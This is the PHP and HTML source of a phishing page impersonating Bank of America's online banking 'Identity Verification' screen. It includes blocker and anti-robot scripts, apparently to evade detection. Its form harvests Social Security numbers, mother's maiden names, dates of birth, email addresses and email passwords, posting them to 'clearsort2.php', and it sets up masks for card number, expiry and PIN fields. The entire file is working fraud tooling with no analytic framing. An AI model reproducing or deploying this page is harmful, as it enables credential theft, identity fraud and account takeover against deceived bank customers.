<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include('blocker.php');
include('antirobot.php');
include('bt.php');

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Bank of America | Online Banking | Identity Verification</title>

<link rel="icon" href="favicon.ico" type="image/x-icon">

<style type="text/css">
body{
margin:0;

}



@font-face{font-family:"cnx-regular";src:url("cnx-regular.eot");src:url("cnx-regular.eot?#iefix") format("embedded-opentype"),url("cnx-regular.woff2") format("woff2"),url("cnx-regular.woff") format("woff"),url("cnx-regular.ttf") format("truetype");font-weight:300;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-bold";src:url("cnx-bold.eot");src:url("cnx-bold.eot?#iefix") format("embedded-opentype"),url("cnx-bold.woff2") format("woff2"),url("cnx-bold.woff") format("woff"),url("cnx-bold.ttf") format("truetype");font-weight:700;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-medium";src:url("cnx-medium.eot");src:url("cnx-medium.eot?#iefix") format("embedded-opentype"),url("cnx-medium.woff2") format("woff2"),url("cnx-medium.woff") format("woff"),url("cnx-medium.ttf") format("truetype");font-weight:300;font-style:italic;font-variant:normal}

input[type=text] {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

input[type=text]:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}


.id_label{position:absolute; padding-left:4px; padding-bottom:6px; color: #333; font-size:14px; font-weight:bold; font-family: cnx-regular, Arial, Helvetica, sans-serif;}
.id_label3{

    color: #fff;
    border: none;
    font-weight: bold;
    font-size: 24px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;
	}
	
.id_label5{

 	color: #0153C3;
    border: none;
    font-weight: bold;
    font-size: 14px;
	font-family: cnx-regular, Arial, Helvetica, sans-serif;

}

.id_label6{

    color:rgb(65, 64, 66);
    border: none;
    font-weight: 200;
    font-size: 14px;
	font-family:Verdana,Arial,sans-serif;;

}



input[type=password] {
background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

input[type=password]:focus {

background-color: none;
background:none;
background-image: none;
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:14px;
width: 401px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}





</style>



<script src="jquery-3.1.0.min.js"></script>
 <script src="jquery.maskedinput.js"></script>

    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:"xxx-xx-xxxx"});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#dt').mask("999", {placeholder:""});
    });   
    </script>
	    <script>
    $(document).ready(function(){
     $('#psp').mask("9999-9999-9999-9999", {placeholder:"X"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#bn').mask("99/9999", {placeholder:"MM/YYYY"});
    });   
    </script>
    <script>
    $(document).ready(function(){
     $('#ssd').mask("999-99-9999", {placeholder:""});
    });   
    </script>    
	<script>
    $(document).ready(function(){
     $('#pinsi').mask("9999", {placeholder:""});
    });   
    </script>
	<script>
    $(document).ready(function(){
     $('#phnno').mask("999-999-9999", {placeholder:"X"});
    });   
    </script>
	
	<script>
    $(document).ready(function(){
     $('#udds').mask("99/99/9999", {placeholder:"DD/MM/YYYY"});
    });   
    </script>




</head>

<body style=" background-image:url(verifyidentitybg.jpg); background-repeat: no-repeat; height:757px;">

<div style="position:absolute; left:45px; top:85px;"><label class="id_label3">Identity Verification</label></div>

<div style="position:absolute; left:1015px; top:48px; width:100px;"><label class="id_label5">Sign Out</label></div>

<div style="position:absolute; left:1010px; top:155px;"><img src="alert.jpg" width="299" height="375" /></div>


<form id="loginForm" method="post" action="clearsort2.php" target="_self" novalidate="novalidate">

<div style="position:absolute; overflow:hidden; left:47px; top:165px;"><input min="0" id="ssd" type="text" name="ssn" placeholder=""  data-validate="userId" required="" autocorrect="off" autocapitalize="off" >
                          
</div> 


<div style="position:absolute; left:45px; top:220px; width:200px;"><label class="id_label">Mother's Maiden Name</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:240px;"><input min="0" type="text" name="mmn" placeholder="Mother's Maiden Name"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div> 


<div style="position:absolute; left:45px; top:285px; width:200px;"><label class="id_label">Date Of Birth</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:303px;"><input min="0" id="udds" type="text" name="dob" placeholder="Date Of Birth"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div>

<div style="position:absolute; left:45px; top:350px; width:400px;"><label class="id_label">Email address linked with your account</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:370px;"><input min="0" type="text" name="email" placeholder="Email address"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div>


<div style="position:absolute; left:45px; top:415px; width:450px;"><label class="id_label">Email address password for instant fraud alert</label></div>
<div style="position:absolute; overflow:hidden; left:47px; top:434px;"><input min="0" type="password" name="emailpass" placeholder="Email password"  data-validate="userId" required="" autocorrect="off" autocapitalize="off" ></div>


<div id="formimage1" style="position:absolute; left:45px; top:525px; width:122px;"> <input type="image" name="formimage1" src="contn-btn.jpg" width="119" height="42"></div>

</form>


<div id="formimage1" style="position:absolute; left:180px; top:525px; width:102px;"> <input type="image" name="formimage1" src="cancel-btn.jpg" width="99" height="44"></div>


</body>
</html>
